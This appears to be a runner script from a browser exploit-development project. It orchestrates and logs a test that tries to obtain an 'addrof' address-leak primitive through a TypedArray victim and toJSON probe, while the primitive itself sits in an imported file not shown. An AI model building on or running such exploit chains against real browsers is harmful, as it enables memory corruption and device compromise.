// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_LeakTargetAsThis, // ATUALIZADO para v55
    FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT // ATUALIZADO para v55
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_LeakTargetAsThis";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (LeakTargetAsThis) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_LeakTargetAsThis();

    logS3(`  Total de chamadas da sonda toJSON: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER);
    if (result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0) {
        logS3(`  Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_for_analysis, null, 2)}`, "dev_verbose");
    }

    if (result.errorCapturedMain) {
        logS3(`  RESULTADO: ERRO JS CAPTURADO: ${result.errorCapturedMain.name} - ${result.errorCapturedMain.message}.`, "error", FNAME_RUNNER);
        document.title = `Heisenbug (TypedArray-LTAT) ERR: ${result.errorCapturedMain.name}`;
        if (result.errorCapturedMain.name === 'TypeError' && result.errorCapturedMain.message.includes("circular structure")) {
            logS3(`    NOTA: TypeError de estrutura circular. Isso é esperado e pode indicar controle.`, "good", FNAME_RUNNER);
        }
    } else {
        logS3(`  RESULTADO: Completou. Stringify Output Final (Parseado): ${result.stringifyResult ? JSON.stringify(result.stringifyResult, null, 2) : 'N/A'}`, "good", FNAME_RUNNER);
        if (result.rawStringifyForAnalysis && result.rawStringifyForAnalysis.includes("circular structure")){
             logS3(`  RAW STRINGIFY OUTPUT CONTÉM 'circular structure'. Analisar C1_details em memória.`, "warn", FNAME_RUNNER);
        }

        let heisenbugOnC1 = false;
        const call2Details = result.all_probe_calls_for_analysis.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
        if (call2Details && (call2Details.payload_A_assigned_to_C1 || call2Details.payload_B_assigned_to_C1 )) {
            heisenbugOnC1 = true;
        }

        if(heisenbugOnC1){
            logS3(`  !!!! HEISENBUG NO C1_DETAILS (Call #2) & PAYLOAD ASSIGNMENT CONFIRMADAS PELA SONDA !!!!`, "critical", FNAME_RUNNER);
        } else {
            // Procurar se algum dos alvos de leak se tornou 'this' e teve tentativa de leitura de addrof
            const leakTargetProbeHit = result.all_probe_calls_for_analysis.find(d => (d.this_is_leak_target_A || d.this_is_leak_target_B) && d.addrof_attempt_val !== null);
            if (leakTargetProbeHit) {
                 logS3(`  !!!! ALVO DE LEAK (${leakTargetProbeHit.this_type}) SE TORNOU 'this' NA SONDA E ADDROF FOI TENTADO (Call #${leakTargetProbeHit.call_number}) !!!!`, "critical", FNAME_RUNNER);
                 heisenbugOnC1 = true; // Reutilizar a flag para indicar que um ponto crítico foi atingido
            } else {
                logS3(`  ALERT: Heisenbug no C1_details (Call #2) ou alvo de leak como 'this' NÃO CONFIRMADA PELA SONDA.`, "error", FNAME_RUNNER);
            }
        }

        let anyAddrofSuccess = (result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success);

        if (result.addrof_A_result) {
            logS3(`    ADDROF A: ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }
        if (result.addrof_B_result) {
            logS3(`    ADDROF B: ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        let lastCallProbeDetails = null;
        if(result.all_probe_calls_for_analysis && result.all_probe_calls_for_analysis.length > 0){
            lastCallProbeDetails = result.all_probe_calls_for_analysis[result.all_probe_calls_for_analysis.length-1];
        }
        if (lastCallProbeDetails && lastCallProbeDetails.error_in_probe) {
            logS3(`    ERRO INTERNO NA ÚLTIMA SONDA REGISTRADA: ${lastCallProbeDetails.error_in_probe}`, "warn", FNAME_RUNNER);
        }

        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: Addr SUCCESS!`;
        } else if (heisenbugOnC1 || (result.rawStringifyForAnalysis && result.rawStringifyForAnalysis.includes("circular structure"))) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: Heisenbug OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}: No Heisenbug?`;
        }
    }
    logS3(`  Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (LeakTargetAsThis) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT}_MainOrchestrator`;
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (LeakTargetAsThis) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") &&
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") &&
            !document.title.includes("ERR") && !document.title.includes("Heisenbug OK")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V55_LTAT} Concluído`;
        }
    }
}
